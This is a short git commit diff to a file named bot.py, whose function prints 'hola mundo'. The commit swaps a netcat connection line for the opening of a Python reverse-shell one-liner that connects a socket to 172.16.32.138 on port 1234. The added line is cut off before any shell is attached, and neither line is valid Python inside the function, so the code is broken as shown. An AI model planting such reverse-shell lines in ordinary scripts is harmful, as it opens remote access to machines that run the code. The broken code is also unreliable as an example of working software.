32e37304caf97f6df5f2882bd021cef3101fd67d
juanangelLerida <79135620+juanangelLerida@users.noreply.github.com>
2023-03-01 19:27:33 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,3 +1,3 @@
 def run():
   print('hola mundo')
-   nc -nv 172.16.32.138 8080
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.32.138",1234))
